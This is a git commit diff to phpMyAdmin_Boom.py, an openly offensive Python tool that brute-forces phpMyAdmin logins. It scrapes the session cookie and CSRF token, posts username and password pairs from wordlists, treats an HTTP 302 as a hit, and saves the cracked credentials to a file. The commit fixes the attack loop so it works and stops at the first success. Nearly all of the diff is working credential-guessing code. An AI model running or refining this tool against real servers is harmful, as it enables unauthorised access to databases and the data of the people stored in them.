d71822f5749a4b89002deb6d8e1111be0e308767
metaStor <metashen@qq.com>
2020-07-30 16:50:41 +0800

    fix some bugs

--- phpMyAdmin_Boom.py
+++ phpMyAdmin_Boom.py
@@ -14,39 +14,58 @@ import threading
 import pyfiglet
 
 
+headers = {
+        'Content-Type':'application/x-www-form-urlencoded',
+        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+      # 'Cookie':'pmaCookieVer=5; pma_lang=zh_CN; pma_collation_connection=utf8mb4_unicode_ci; phpMyAdmin=vo6nt8q71hsv93fb9a7c5b5oot2215gq',
+        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
+}
+
 def init():
     banners = pyfiglet.figlet_format('phpMyAdmin Boom')
     print(banners)
     print('\t\t\t\t\t\tPower by metaStor  v1.0\n\n')
 
 
-def attack(user, password, output):
-    global flag
-    resp = requests.get(url)
+def attack(url, user, password, output):
+    header = headers
+    # first get
+    resp = requests.get(url, headers=headers)
     cookie = resp.headers['Set-Cookie']
     # 在header中
     set_session = re.findall(r'phpMyAdmin=(.*?);', cookie)
+    header['Cookie'] = 'pmaCookieVer=5; pma_lang=zh_CN; pma_collation_connection=utf8mb4_unicode_ci; phpMyAdmin=%s' % set_session
     # 在响应的源代码中
     token = re.findall(r'<input type="hidden" name="token" value="(.*?) />', resp.text)[0]
     # print(resp.text)
     # print(token)
-    post_data = {"set_session": set_session, "pma_username": user, "pma_password": password, "server": "1",
-                 "target": "index.php", "token": token}
-    response = requests.post(url, data=post_data, allow_redirects=False)
+    post_data = {"pma_username": user, "pma_password": password, "server": "1", "target": "index.php", "token": token}
+    # Redirects
+    response = requests.post(url + r"/index.php", data=post_data, allow_redirects=True)
+    # no Redirects
+    response = requests.post(url + r"/index.php", data=post_data, headers=header, allow_redirects=False)
     # flag of success
+    # Redirects
+    #if "themes/pmahomme/img/logo_right.png" in str(response.text):
+    #if "phpMyAdmin is more friendly with a " in str(response.text):
+    # no Redirects
     if response.status_code == 302:
-        print("\033[1;31;0m[!] Find it!  ==>\t%s %s \031" % (user, password))
+        print("\033[1;31;44m[!] Find it!  ==>\t%s %s \033[0m" % (user, password))
         if output:
             write(output, user, password)
+        return True
+    return False
 
 
 # 当前为单线程
-def run(user, passwords, output):
+def run(url, user, passwords, output):
     print("[!] Attack " + user)
     for line in open(passwords, 'r'):
         password = line.strip()
-        attack(user, password, output)
-        print('[!] Attempt\t%s - %s' % (user, password))
+        res = attack(url, user, password, output)
+        if res:
+            sys.exit(0)
+        print('[-] Attempt\t%s - %s' % (user, password))
         # t = threading.Thread(target=attack, args=(user, password))
         # t.start()
 
@@ -91,10 +110,10 @@ if __name__ == '__main__':
             if '.' in users:
                 for line in open(users, 'r'):
                     user = line.strip()
-                    run(user, passwords, output)
+                    run(url, user, passwords, output)
             # Just a username
             else:
-                run(users, passwords, output)
+                run(url, users, passwords, output)
             print("\n[!] Complete")
         else:
             exception()
